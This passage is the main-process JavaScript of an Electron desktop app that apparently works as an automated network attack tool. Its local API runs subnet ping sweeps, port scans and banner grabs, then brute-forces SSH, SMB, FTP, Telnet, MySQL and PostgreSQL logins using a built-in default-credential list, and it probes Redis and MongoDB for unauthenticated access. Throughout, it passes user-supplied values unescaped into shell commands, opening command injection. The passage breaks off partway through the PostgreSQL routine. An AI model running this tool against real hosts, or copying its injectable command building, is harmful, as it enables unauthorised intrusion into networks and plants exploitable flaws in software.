const { app, BrowserWindow, Menu, shell, dialog, ipcMain } = require('electron');
const path = require('path');
const http = require('http');
const fs = require('fs');
const { exec, spawn } = require('child_process');
const net = require('net');
const os = require('os');
const crypto = require('crypto');

let mainWindow;
let httpServer;
const isDev = process.env.NODE_ENV === 'development';

// Handle NSIS installer events (install/uninstall/update) - quit immediately
if (process.platform === 'win32') {
    const cmd = process.argv[1];
    if (cmd === '--squirrel-install' || cmd === '--squirrel-updated' ||
        cmd === '--squirrel-uninstall' || cmd === '--squirrel-obsolete') {
        app.quit();
    }
}

// Enforce single instance - prevent app from opening multiple times
const gotTheLock = app.requestSingleInstanceLock();
if (!gotTheLock) {
    app.quit();
} else {
    app.on('second-instance', () => {
        if (mainWindow) {
            if (mainWindow.isMinimized()) mainWindow.restore();
            mainWindow.focus();
        }
    });
}

// Find an available port starting from the given one
function findAvailablePort(startPort) {
    return new Promise((resolve) => {
        const server = net.createServer();
        server.listen(startPort, '127.0.0.1', () => {
            const port = server.address().port;
            server.close(() => resolve(port));
        });
        server.on('error', () => {
            resolve(findAvailablePort(startPort + 1));
        });
    });
}

// Get app data directory for persistent storage
function getAppDataPath() {
    const appData = app.getPath('userData');
    if (!fs.existsSync(appData)) {
        fs.mkdirSync(appData, { recursive: true });
    }
    return appData;
}

function getUsersFilePath() {
    return path.join(getAppDataPath(), 'users.json');
}

function getUsers() {
    const filePath = getUsersFilePath();
    if (!fs.existsSync(filePath)) return {};
    try {
        return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    } catch { return {}; }
}

function saveUsers(users) {
    fs.writeFileSync(getUsersFilePath(), JSON.stringify(users, null, 2));
}

function hashPassword(password) {
    return crypto.createHash('sha256').update(password).digest('hex');
}

// MIME types for static file serving
const MIME_TYPES = {
    '.html': 'text/html',
    '.js': 'application/javascript',
    '.css': 'text/css',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon',
    '.woff': 'font/woff',
    '.woff2': 'font/woff2',
    '.ttf': 'font/ttf',
    '.txt': 'text/plain',
    '.map': 'application/json'
};

// Get the path to the static export directory
function getStaticDir() {
    if (app.isPackaged) {
        return path.join(process.resourcesPath, 'out');
    }
    return path.join(__dirname, '..', 'out');
}

// Combined server: API endpoints + static file serving
function createAppServer() {
    return http.createServer((req, res) => {
        const urlPath = req.url.split('?')[0];

        // Handle API requests
        if (urlPath.startsWith('/api/')) {
            let body = '';
            req.on('data', chunk => body += chunk);
            req.on('end', () => {
                res.setHeader('Access-Control-Allow-Origin', '*');
                res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
                res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
                res.setHeader('Content-Type', 'application/json');

                if (req.method === 'OPTIONS') {
                    res.writeHead(200);
                    return res.end();
                }

                try {
                    handleApiRequest(urlPath, req.method, body, res);
                } catch (err) {
                    res.writeHead(500);
                    res.end(JSON.stringify({ error: err.message }));
                }
            });
            return;
        }

        // Handle CORS preflight for any route
        if (req.method === 'OPTIONS') {
            res.setHeader('Access-Control-Allow-Origin', '*');
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
            res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
            res.writeHead(200);
            return res.end();
        }

        // Serve static files from the Next.js export
        serveStaticFile(urlPath, res);
    });
}

function handleApiRequest(urlPath, method, body, res) {
    // Registration check
    if (urlPath === '/api/registration-status' && method === 'GET') {
        const users = getUsers();
        res.writeHead(200);
        return res.end(JSON.stringify({ registration_needed: Object.keys(users).length === 0 }));
    }

    // Register
    if (urlPath === '/api/register' && method === 'POST') {
        const data = JSON.parse(body);
        const users = getUsers();
        if (users[data.username]) {
            res.writeHead(400);
            return res.end(JSON.stringify({ error: 'User already exists' }));
        }
        users[data.username] = {
            password: hashPassword(data.password),
            createdAt: new Date().toISOString()
        };
        saveUsers(users);
        const token = crypto.randomBytes(32).toString('hex');
        res.writeHead(200);
        return res.end(JSON.stringify({
            user: { name: data.username },
            token: token,
            token_expiration_time: Date.now() + 86400000
        }));
    }

    // Login
    if (urlPath === '/api/login' && method === 'POST') {
        const data = JSON.parse(body);
        const users = getUsers();
        const user = users[data.username];
        if (!user || user.password !== hashPassword(data.password)) {
            res.writeHead(401);
            return res.end(JSON.stringify({ error: 'Invalid credentials' }));
        }
        const token = crypto.randomBytes(32).toString('hex');
        res.writeHead(200);
        return res.end(JSON.stringify({
            user: { name: data.username },
            token: token,
            token_expiration_time: Date.now() + 86400000
        }));
    }

    // Network scan (real ping sweep)
    if (urlPath === '/api/scan-network' && method === 'POST') {
        const data = JSON.parse(body);
        const subnet = data.subnet || getLocalSubnet();
        performNetworkScan(subnet, (results) => {
            res.writeHead(200);
            res.end(JSON.stringify({ hosts: results, subnet: subnet }));
        });
        return;
    }

    // Port scan (real)
    if (urlPath === '/api/scan-ports' && method === 'POST') {
        const data = JSON.parse(body);
        performPortScan(data.host, data.ports || [22, 80, 443, 445, 3389, 8080, 8443], (results) => {
            res.writeHead(200);
            res.end(JSON.stringify({ host: data.host, ports: results }));
        });
        return;
    }

    // Network info
    if (urlPath === '/api/network-info' && method === 'GET') {
        res.writeHead(200);
        return res.end(JSON.stringify(getNetworkInfo()));
    }

    // System info
    if (urlPath === '/api/system-info' && method === 'GET') {
        res.writeHead(200);
        return res.end(JSON.stringify({
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            cpus: os.cpus().length,
            totalMemory: os.totalmem(),
            freeMemory: os.freemem(),
            uptime: os.uptime(),
            networkInterfaces: getNetworkInfo().interfaces,
            version: '2.5.0'
        }));
    }

    // SSH exploitation attempt (real TCP connection test)
    if (urlPath === '/api/exploit-ssh' && method === 'POST') {
        const data = JSON.parse(body);
        attemptSSHExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // SMB exploitation attempt (real TCP connection test)
    if (urlPath === '/api/exploit-smb' && method === 'POST') {
        const data = JSON.parse(body);
        attemptSMBExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Post-exploitation data collection
    if (urlPath === '/api/post-exploit' && method === 'POST') {
        const data = JSON.parse(body);
        collectPostExploitData(data.host, data.method, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Service banner grabbing
    if (urlPath === '/api/grab-banner' && method === 'POST') {
        const data = JSON.parse(body);
        grabServiceBanner(data.host, data.port, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // OS fingerprinting
    if (urlPath === '/api/fingerprint-os' && method === 'POST') {
        const data = JSON.parse(body);
        fingerprintOS(data.host, data.openPorts || [], (os) => {
            res.writeHead(200);
            res.end(JSON.stringify({ host: data.host, os }));
        });
        return;
    }

    // Full auto-exploit: tries all methods against a host
    if (urlPath === '/api/auto-exploit' && method === 'POST') {
        const data = JSON.parse(body);
        autoExploit(data.host, data.openPorts || [], data.credentials || [], (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // FTP exploitation
    if (urlPath === '/api/exploit-ftp' && method === 'POST') {
        const data = JSON.parse(body);
        attemptFTPExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Telnet exploitation
    if (urlPath === '/api/exploit-telnet' && method === 'POST') {
        const data = JSON.parse(body);
        attemptTelnetExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // Redis no-auth exploitation
    if (urlPath === '/api/exploit-redis' && method === 'POST') {
        const data = JSON.parse(body);
        attemptRedisExploit(data.host, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // MongoDB no-auth exploitation
    if (urlPath === '/api/exploit-mongodb' && method === 'POST') {
        const data = JSON.parse(body);
        attemptMongoExploit(data.host, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // MySQL exploitation
    if (urlPath === '/api/exploit-mysql' && method === 'POST') {
        const data = JSON.parse(body);
        attemptMySQLExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // PostgreSQL exploitation
    if (urlPath === '/api/exploit-postgres' && method === 'POST') {
        const data = JSON.parse(body);
        attemptPostgresExploit(data.host, data.username, data.password, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    // VNC no-auth check
    if (urlPath === '/api/exploit-vnc' && method === 'POST') {
        const data = JSON.parse(body);
        attemptVNCExploit(data.host, (result) => {
            res.writeHead(200);
            res.end(JSON.stringify(result));
        });
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: 'Not found' }));
}

function serveStaticFile(urlPath, res) {
    const staticDir = getStaticDir();

    // Try to find the file
    let filePath;
    const decodedPath = decodeURIComponent(urlPath);

    if (decodedPath === '/') {
        filePath = path.join(staticDir, 'index.html');
    } else {
        // First try exact file path
        filePath = path.join(staticDir, decodedPath);
    }

    // Security: prevent path traversal
    if (!filePath.startsWith(staticDir)) {
        res.writeHead(403);
        return res.end('Forbidden');
    }

    // Try the exact path, then with index.html, then with .html
    const candidates = [
        filePath,
        path.join(filePath, 'index.html'),
        filePath + '.html',
        filePath.replace(/\/$/, '') + '/index.html'
    ];

    for (const candidate of candidates) {
        if (fs.existsSync(candidate) && fs.statSync(candidate).isFile()) {
            const ext = path.extname(candidate).toLowerCase();
            const contentType = MIME_TYPES[ext] || 'application/octet-stream';
            res.setHeader('Content-Type', contentType);
            res.writeHead(200);
            const stream = fs.createReadStream(candidate);
            stream.pipe(res);
            return;
        }
    }

    // Fallback: serve index.html for client-side routing
    const indexPath = path.join(staticDir, 'index.html');
    if (fs.existsSync(indexPath)) {
        res.setHeader('Content-Type', 'text/html');
        res.writeHead(200);
        fs.createReadStream(indexPath).pipe(res);
        return;
    }

    res.writeHead(404);
    res.end('Not found');
}

// Real network scanning functions
function getLocalSubnet() {
    const interfaces = os.networkInterfaces();
    for (const iface of Object.values(interfaces)) {
        for (const addr of iface) {
            if (addr.family === 'IPv4' && !addr.internal) {
                const parts = addr.address.split('.');
                return `${parts[0]}.${parts[1]}.${parts[2]}`;
            }
        }
    }
    return '192.168.1';
}

function getNetworkInfo() {
    const interfaces = os.networkInterfaces();
    const result = { interfaces: [], localIP: '', subnet: '' };
    for (const [name, addrs] of Object.entries(interfaces)) {
        for (const addr of addrs) {
            if (addr.family === 'IPv4') {
                result.interfaces.push({
                    name: name,
                    address: addr.address,
                    netmask: addr.netmask,
                    mac: addr.mac,
                    internal: addr.internal
                });
                if (!addr.internal) {
                    result.localIP = addr.address;
                    const parts = addr.address.split('.');
                    result.subnet = `${parts[0]}.${parts[1]}.${parts[2]}.0/24`;
                }
            }
        }
    }
    return result;
}

function performNetworkScan(subnet, callback) {
    const hosts = [];
    let pending = 0;
    const isWin = process.platform === 'win32';

    for (let i = 1; i <= 254; i++) {
        const ip = `${subnet}.${i}`;
        pending++;

        const pingCmd = isWin
            ? `ping -n 1 -w 500 ${ip}`
            : `ping -c 1 -W 1 ${ip}`;

        exec(pingCmd, { timeout: 2000 }, (error, stdout) => {
            if (!error && stdout) {
                const isAlive = isWin
                    ? !stdout.includes('Request timed out') && !stdout.includes('Destination host unreachable')
                    : stdout.includes('1 received') || stdout.includes('1 packets received');
                if (isAlive) {
                    hosts.push({
                        ip: ip,
                        alive: true,
                        responseTime: extractPingTime(stdout),
                        hostname: '',
                        discoveredAt: new Date().toISOString()
                    });
                }
            }
            pending--;
            if (pending === 0) {
                hosts.sort((a, b) => {
                    const aParts = a.ip.split('.').map(Number);
                    const bParts = b.ip.split('.').map(Number);
                    return aParts[3] - bParts[3];
                });
                callback(hosts);
            }
        });
    }
}

function extractPingTime(output) {
    const match = output.match(/time[=<](\d+\.?\d*)\s*ms/i);
    return match ? parseFloat(match[1]) : 0;
}

function performPortScan(host, ports, callback) {
    const results = [];
    let pending = ports.length;

    const commonServices = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
        80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
        445: 'SMB', 993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL',
        3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
        6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
    };

    ports.forEach(port => {
        const socket = new net.Socket();
        socket.setTimeout(2000);

        socket.on('connect', () => {
            results.push({
                port: port,
                state: 'open',
                service: commonServices[port] || 'unknown'
            });
            socket.destroy();
            pending--;
            if (pending === 0) callback(results.sort((a, b) => a.port - b.port));
        });

        socket.on('timeout', () => {
            results.push({ port: port, state: 'filtered', service: commonServices[port] || 'unknown' });
            socket.destroy();
            pending--;
            if (pending === 0) callback(results.sort((a, b) => a.port - b.port));
        });

        socket.on('error', () => {
            results.push({ port: port, state: 'closed', service: commonServices[port] || 'unknown' });
            pending--;
            if (pending === 0) callback(results.sort((a, b) => a.port - b.port));
        });

        socket.connect(port, host);
    });
}

// ===== ENHANCED MONKEY EXPLOITATION ENGINE =====

// Service banner grabber - grabs banners from any TCP service
function grabServiceBanner(host, port, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let banner = '';

    socket.on('connect', () => {
        // Some services send banner on connect, others need a probe
        const probes = {
            21: 'USER anonymous\r\n',
            25: 'EHLO monkey\r\n',
            80: 'HEAD / HTTP/1.0\r\nHost: ' + host + '\r\n\r\n',
            110: 'USER test\r\n',
            143: 'a001 CAPABILITY\r\n',
            8080: 'HEAD / HTTP/1.0\r\nHost: ' + host + '\r\n\r\n',
            8443: 'HEAD / HTTP/1.0\r\nHost: ' + host + '\r\n\r\n'
        };

        setTimeout(() => {
            if (probes[port]) {
                socket.write(probes[port]);
            }
        }, 500);
    });

    socket.on('data', (data) => {
        banner += data.toString();
        if (banner.length > 500) {
            socket.destroy();
            callback({ port, banner: banner.substring(0, 500).trim() });
        }
    });

    socket.on('timeout', () => {
        socket.destroy();
        callback({ port, banner: banner.trim() || null });
    });

    socket.on('error', () => {
        callback({ port, banner: null });
    });

    socket.on('close', () => {
        callback({ port, banner: banner.trim() || null });
    });

    socket.connect(port, host);
}

// OS fingerprinting via TCP/IP stack analysis
function fingerprintOS(host, openPorts, callback) {
    let os = 'Unknown';
    const portSet = new Set(openPorts.map(p => p.port));

    // Heuristic-based OS detection
    if (portSet.has(445) || portSet.has(135) || portSet.has(139) || portSet.has(3389)) {
        os = 'Windows';
        if (portSet.has(3389)) os = 'Windows (RDP enabled)';
        if (portSet.has(1433)) os = 'Windows (SQL Server)';
    } else if (portSet.has(22)) {
        os = 'Linux/Unix';
        if (portSet.has(8080) || portSet.has(8443)) os = 'Linux (Web Server)';
        if (portSet.has(3306)) os = 'Linux (MySQL)';
        if (portSet.has(5432)) os = 'Linux (PostgreSQL)';
        if (portSet.has(6379)) os = 'Linux (Redis)';
        if (portSet.has(27017)) os = 'Linux (MongoDB)';
    } else if (portSet.has(80) || portSet.has(443)) {
        os = 'Network Device / Web Server';
    } else if (portSet.has(23)) {
        os = 'Network Device (Telnet)';
    }

    // Try TTL-based OS detection via ping
    const isWin = process.platform === 'win32';
    const pingCmd = isWin ? `ping -n 1 -w 2000 ${host}` : `ping -c 1 -W 2 ${host}`;
    exec(pingCmd, { timeout: 5000 }, (err, stdout) => {
        if (stdout) {
            const ttlMatch = stdout.match(/ttl[=:](\d+)/i);
            if (ttlMatch) {
                const ttl = parseInt(ttlMatch[1]);
                if (ttl <= 64 && ttl > 0) {
                    if (os === 'Unknown') os = 'Linux/Unix (TTL≤64)';
                } else if (ttl <= 128 && ttl > 64) {
                    if (os === 'Unknown') os = 'Windows (TTL≤128)';
                } else if (ttl <= 255 && ttl > 128) {
                    if (os === 'Unknown') os = 'Network Device (TTL≤255)';
                }
            }
        }
        callback(os);
    });
}

// SSH exploitation with real credential testing
function attemptSSHExploit(host, username, password, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let banner = '';
    let dataReceived = false;

    socket.on('connect', () => {
        socket.on('data', (data) => {
            if (dataReceived) return;
            dataReceived = true;
            banner = data.toString().trim();
            socket.destroy();

            const isWin = process.platform === 'win32';
            if (isWin) {
                // Windows: use plink if available, otherwise report banner
                exec(`where plink 2>nul`, { timeout: 2000 }, (err) => {
                    if (!err) {
                        exec(`echo y | plink -ssh -l ${username} -pw ${password} ${host} "echo MONKEY_SUCCESS" 2>&1`, { timeout: 15000 }, (error, stdout) => {
                            callback({
                                success: stdout && stdout.includes('MONKEY_SUCCESS'),
                                method: 'SSH', banner, host, username,
                                info: stdout && stdout.includes('MONKEY_SUCCESS') ? 'Full SSH access gained' : 'Auth failed'
                            });
                        });
                    } else {
                        // Try ssh.exe (Windows 10+)
                        const escapedPass = password.replace(/"/g, '\\"');
                        exec(`echo ${escapedPass} | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${username}@${host} "echo MONKEY_SUCCESS" 2>&1`, { timeout: 15000 }, (error, stdout) => {
                            callback({
                                success: stdout && stdout.includes('MONKEY_SUCCESS'),
                                method: 'SSH', banner, host, username,
                                info: 'SSH connection attempted via ssh.exe'
                            });
                        });
                    }
                });
            } else {
                // Linux/Mac: try sshpass first, then expect
                exec(`which sshpass 2>/dev/null`, { timeout: 2000 }, (err) => {
                    if (!err) {
                        const escapedPass = password.replace(/'/g, "'\\''");
                        exec(`sshpass -p '${escapedPass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=no ${username}@${host} "echo MONKEY_SUCCESS && uname -a && id && hostname" 2>&1`, { timeout: 15000 }, (error, stdout) => {
                            const success = stdout && stdout.includes('MONKEY_SUCCESS');
                            callback({
                                success, method: 'SSH', banner, host, username,
                                info: success ? stdout.replace('MONKEY_SUCCESS', '').trim() : 'Authentication failed',
                                sysInfo: success ? stdout : null
                            });
                        });
                    } else {
                        // Fallback: try without sshpass using expect-like approach
                        exec(`ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o NumberOfPasswordPrompts=0 ${username}@${host} exit 2>&1`, { timeout: 8000 }, (error, stdout) => {
                            const hasKeyAuth = !error;
                            callback({
                                success: hasKeyAuth,
                                method: 'SSH', banner, host, username,
                                info: hasKeyAuth ? 'Key-based auth succeeded' : 'SSH open, install sshpass for credential testing'
                            });
                        });
                    }
                });
            }
        });
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'SSH', error: 'Connection timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'SSH', error: err.message }); });
    socket.connect(22, host);
}

// SMB exploitation with real credential testing
function attemptSMBExploit(host, username, password, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);

    socket.on('connect', () => {
        socket.destroy();
        const isWin = process.platform === 'win32';
        if (isWin) {
            // Windows: use net use for SMB authentication
            exec(`net use \\\\${host}\\IPC$ /user:${username} "${password}" 2>&1`, { timeout: 15000 }, (error, stdout) => {
                const success = !error && !stdout.toLowerCase().includes('error') && !stdout.toLowerCase().includes('denied');
                if (success) {
                    // Get shares list
                    exec(`net view \\\\${host} 2>&1`, { timeout: 10000 }, (err2, shares) => {
                        exec(`net use \\\\${host}\\IPC$ /delete /y 2>&1`, { timeout: 5000 }, () => {});
                        callback({ success: true, method: 'SMB', host, username, shares: shares || '', info: 'SMB authentication successful' });
                    });
                } else {
                    callback({ success: false, method: 'SMB', error: 'SMB authentication failed', info: stdout });
                }
            });
        } else {
            // Linux: try smbclient, then rpcclient
            exec(`which smbclient 2>/dev/null`, { timeout: 2000 }, (err) => {
                if (!err) {
                    const escapedPass = password.replace(/'/g, "'\\''");
                    exec(`smbclient -L //${host} -U '${username}%${escapedPass}' -t 5 2>&1`, { timeout: 15000 }, (error, stdout) => {
                        const success = stdout && (stdout.includes('Sharename') || stdout.includes('Disk') || stdout.includes('IPC'));
                        callback({
                            success, method: 'SMB', host, username,
                            shares: success ? stdout : '',
                            info: success ? 'SMB shares enumerated' : 'SMB auth failed'
                        });
                    });
                } else {
                    // Try rpcclient
                    exec(`which rpcclient 2>/dev/null`, { timeout: 2000 }, (err2) => {
                        if (!err2) {
                            const escapedPass = password.replace(/'/g, "'\\''");
                            exec(`rpcclient -U '${username}%${escapedPass}' ${host} -c 'srvinfo' 2>&1`, { timeout: 10000 }, (error, stdout) => {
                                const success = stdout && !stdout.includes('NT_STATUS');
                                callback({ success, method: 'SMB-RPC', host, username, info: success ? stdout.trim() : 'RPC auth failed' });
                            });
                        } else {
                            callback({ success: false, method: 'SMB', error: 'SMB open but no smbclient/rpcclient available' });
                        }
                    });
                }
            });
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'SMB', error: 'Connection timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'SMB', error: err.message }); });
    socket.connect(445, host);
}

// Enhanced post-exploitation data collection
function collectPostExploitData(host, method, callback) {
    const isWin = process.platform === 'win32';
    const results = { host, hostname: '', os: 'Unknown', info: '', services: [], users: '' };

    // Reverse DNS lookup
    const dnsCmd = isWin ? `nslookup ${host}` : `host ${host}`;
    exec(`${dnsCmd} 2>&1`, { timeout: 5000 }, (err, stdout) => {
        if (stdout) {
            const match = stdout.match(/name\s*[=:]\s*(\S+)/i) || stdout.match(/pointer\s+(\S+)/i) || stdout.match(/Name:\s+(\S+)/i);
            if (match) results.hostname = match[1].replace(/\.$/, '');
        }

        // OS detection
        results.os = method && method.includes('SSH') ? 'Linux/Unix' : method && method.includes('SMB') ? 'Windows' : 'Unknown';

        // Try ARP for MAC address
        const arpCmd = isWin ? `arp -a ${host}` : `arp -n ${host}`;
        exec(`${arpCmd} 2>&1`, { timeout: 3000 }, (arpErr, arpOut) => {
            let mac = '';
            if (arpOut) {
                const macMatch = arpOut.match(/([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}/);
                if (macMatch) mac = macMatch[0];
            }

            results.info = `Hostname: ${results.hostname || 'unknown'}, MAC: ${mac || 'unknown'}, Access: ${method || 'unknown'}`;
            callback(results);
        });
    });
}

// ===== DEFAULT CREDENTIAL DICTIONARY =====
const DEFAULT_CREDENTIALS = [
    { username: 'root', password: 'root' },
    { username: 'root', password: 'toor' },
    { username: 'root', password: '' },
    { username: 'root', password: 'password' },
    { username: 'root', password: '123456' },
    { username: 'root', password: 'admin' },
    { username: 'admin', password: 'admin' },
    { username: 'admin', password: 'password' },
    { username: 'admin', password: '123456' },
    { username: 'admin', password: '' },
    { username: 'admin', password: 'admin123' },
    { username: 'user', password: 'user' },
    { username: 'user', password: 'password' },
    { username: 'test', password: 'test' },
    { username: 'guest', password: 'guest' },
    { username: 'pi', password: 'raspberry' },
    { username: 'ubuntu', password: 'ubuntu' },
    { username: 'postgres', password: 'postgres' },
    { username: 'mysql', password: 'mysql' },
    { username: 'oracle', password: 'oracle' },
    { username: 'sa', password: '' },
    { username: 'sa', password: 'sa' },
    { username: 'administrator', password: 'administrator' },
    { username: 'administrator', password: 'password' },
    { username: 'administrator', password: '' }
];

// FTP exploitation: anonymous + credential brute-force
function attemptFTPExploit(host, username, password, callback) {
    const socket = new net.Socket();
    socket.setTimeout(8000);
    let response = '';
    let phase = 'connect';

    socket.on('connect', () => {});

    socket.on('data', (data) => {
        response += data.toString();

        if (phase === 'connect' && response.includes('220')) {
            phase = 'user';
            socket.write(`USER ${username}\r\n`);
        } else if (phase === 'user' && (response.includes('331') || response.includes('230'))) {
            if (response.includes('230')) {
                socket.destroy();
                callback({ success: true, method: 'FTP', host, username, info: 'FTP login without password' });
                return;
            }
            phase = 'pass';
            socket.write(`PASS ${password}\r\n`);
        } else if (phase === 'pass') {
            socket.destroy();
            if (response.includes('230')) {
                callback({ success: true, method: 'FTP', host, username, info: 'FTP credentials valid' });
            } else {
                callback({ success: false, method: 'FTP', error: 'FTP login failed' });
            }
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'FTP', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'FTP', error: err.message }); });
    socket.connect(21, host);
}

// Telnet exploitation
function attemptTelnetExploit(host, username, password, callback) {
    const socket = new net.Socket();
    socket.setTimeout(10000);
    let response = '';
    let sentUser = false;
    let sentPass = false;

    socket.on('connect', () => {});

    socket.on('data', (data) => {
        response += data.toString();
        const lower = response.toLowerCase();

        if (!sentUser && (lower.includes('login:') || lower.includes('username:'))) {
            sentUser = true;
            socket.write(username + '\r\n');
        } else if (sentUser && !sentPass && (lower.includes('password:') || lower.includes('pass:'))) {
            sentPass = true;
            socket.write(password + '\r\n');
        } else if (sentPass) {
            setTimeout(() => {
                socket.destroy();
                const success = !lower.includes('incorrect') && !lower.includes('failed') &&
                    !lower.includes('denied') && !lower.includes('invalid') &&
                    (lower.includes('$') || lower.includes('#') || lower.includes('>') || lower.includes('welcome') || lower.includes('last login'));
                callback({ success, method: 'Telnet', host, username, info: success ? 'Telnet access gained' : 'Telnet login failed' });
            }, 2000);
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'Telnet', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'Telnet', error: err.message }); });
    socket.connect(23, host);
}

// Redis no-auth exploitation
function attemptRedisExploit(host, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);
    let response = '';

    socket.on('connect', () => {
        socket.write('PING\r\n');
    });

    socket.on('data', (data) => {
        response += data.toString();
        if (response.includes('+PONG')) {
            // Redis responds without auth - try to get info
            socket.write('INFO server\r\n');
            setTimeout(() => {
                socket.destroy();
                callback({
                    success: true, method: 'Redis-NoAuth', host,
                    info: 'Redis accessible without authentication',
                    version: (response.match(/redis_version:(\S+)/) || [null, 'unknown'])[1],
                    sysInfo: response.substring(0, 500)
                });
            }, 1000);
        } else if (response.includes('-NOAUTH') || response.includes('-ERR')) {
            socket.destroy();
            callback({ success: false, method: 'Redis', error: 'Redis requires authentication' });
        }
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'Redis', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'Redis', error: err.message }); });
    socket.connect(6379, host);
}

// MongoDB no-auth exploitation
function attemptMongoExploit(host, callback) {
    const socket = new net.Socket();
    socket.setTimeout(5000);

    socket.on('connect', () => {
        // MongoDB wire protocol: send isMaster command
        // Simplified: just check if port accepts connection and responds
        const isWin = process.platform === 'win32';
        socket.destroy();

        // Try mongosh/mongo CLI
        const mongoCmd = isWin ? 'mongosh' : 'mongosh';
        exec(`which ${mongoCmd} 2>/dev/null || which mongo 2>/dev/null`, { timeout: 2000 }, (err, which) => {
            if (!err && which.trim()) {
                const cmd = which.trim();
                exec(`${cmd} --host ${host} --eval "db.adminCommand('listDatabases')" --quiet 2>&1`, { timeout: 10000 }, (error, stdout) => {
                    const success = stdout && (stdout.includes('databases') || stdout.includes('name'));
                    callback({
                        success, method: 'MongoDB-NoAuth', host,
                        info: success ? 'MongoDB accessible without auth' : 'MongoDB requires auth',
                        sysInfo: success ? stdout.substring(0, 500) : null
                    });
                });
            } else {
                // No mongo client - just report port is open
                callback({ success: false, method: 'MongoDB', host, info: 'MongoDB port open, install mongosh for exploitation', portOpen: true });
            }
        });
    });

    socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'MongoDB', error: 'Timeout' }); });
    socket.on('error', (err) => { callback({ success: false, method: 'MongoDB', error: err.message }); });
    socket.connect(27017, host);
}

// MySQL exploitation
function attemptMySQLExploit(host, username, password, callback) {
    const isWin = process.platform === 'win32';
    exec(`which mysql 2>/dev/null`, { timeout: 2000 }, (err) => {
        if (!err) {
            const passFlag = password ? `-p'${password.replace(/'/g, "\\'")}'` : '';
            exec(`mysql -h ${host} -u ${username} ${passFlag} -e "SELECT version();" 2>&1`, { timeout: 10000 }, (error, stdout) => {
                const success = stdout && (stdout.includes('version') || stdout.match(/\d+\.\d+\.\d+/));
                callback({
                    success, method: 'MySQL', host, username,
                    info: success ? `MySQL access: ${stdout.trim().split('\n').pop()}` : 'MySQL auth failed',
                    sysInfo: success ? stdout : null
                });
            });
        } else {
            // Try raw TCP handshake
            const socket = new net.Socket();
            socket.setTimeout(5000);
            socket.on('connect', () => {
                socket.on('data', (data) => {
                    socket.destroy();
                    const banner = data.toString('utf8', 0, Math.min(data.length, 100));
                    callback({ success: false, method: 'MySQL', host, info: 'MySQL port open, install mysql client for exploitation', banner });
                });
            });
            socket.on('error', (e) => { callback({ success: false, method: 'MySQL', error: e.message }); });
            socket.on('timeout', () => { socket.destroy(); callback({ success: false, method: 'MySQL', error: 'Timeout' }); });
            socket.connect(3306, host);
        }
    });
}

// PostgreSQL exploitation
function attemptPostgresExploit(host, username, password, callback) {
    exec(`which psql 2>/dev/null`, { timeout: 2000 }, (err) => {
        if (!err) {
            const env = password ? `PGPASSWORD='${password.replace(/'/g, "\\'")}'` : '';
            exec(`${env} psql -h ${host} -U ${username} -c "SELECT version();" -t 2>&1`, { timeout: 10000 }, (error, stdout) => {
                const success = stdout && (stdout.includes('PostgreSQL') || stdout.match(/\d+\.\d+/));
                callback({
                    success, method: 'PostgreSQL', host, username,
                    info: success ? `PostgreSQL access: ${stdout.trim()}` : 'PostgreSQL auth failed',
                    sysInfo: success ? stdout : null
                });
            });
        } else {
            const socket = new net.Socket();
            socket.setTimeout(5000);
